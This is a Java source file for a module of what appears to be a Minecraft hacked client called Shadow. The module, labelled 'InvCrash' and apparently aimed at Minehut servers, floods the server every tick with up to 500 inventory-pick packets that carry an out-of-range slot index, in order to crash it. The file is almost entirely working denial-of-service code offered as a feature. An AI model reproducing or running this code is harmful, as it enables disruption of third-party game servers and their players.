package net.shadow.feature.module;

import net.minecraft.client.gui.screen.ingame.SignEditScreen;
import net.minecraft.network.packet.c2s.play.PickFromInventoryC2SPacket;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;
import net.minecraft.network.packet.c2s.play.UpdateSignC2SPacket;
import net.minecraft.util.math.BlockPos;
import net.minecraft.world.World;
import net.shadow.Shadow;
import net.shadow.event.events.PacketOutput;
import net.shadow.feature.base.Module;
import net.shadow.feature.base.ModuleType;
import net.shadow.feature.configuration.SliderValue;
import net.shadow.utils.ChatUtils;

public class MinehutCrashModule extends Module implements PacketOutput{
    static World w;
    final SliderValue r = this.config.create("Power", 15, 10, 500, 1);
    int smallticks;

    public MinehutCrashModule() {
        super("InvCrash", "real new crash", ModuleType.CRASH);
    }


    @Override
    public void onEnable() {
    }

    @Override
    public void onDisable() {
    }

    @Override
    public void onUpdate() {
        for(int i = 0; i < r.getThis(); i++) Shadow.c.player.networkHandler.sendPacket(new PickFromInventoryC2SPacket(32767));
    }

    @Override
    public void onRender() {

    }


    @Override
    public void onSentPacket(PacketOutputEvent event) {   
    }
}
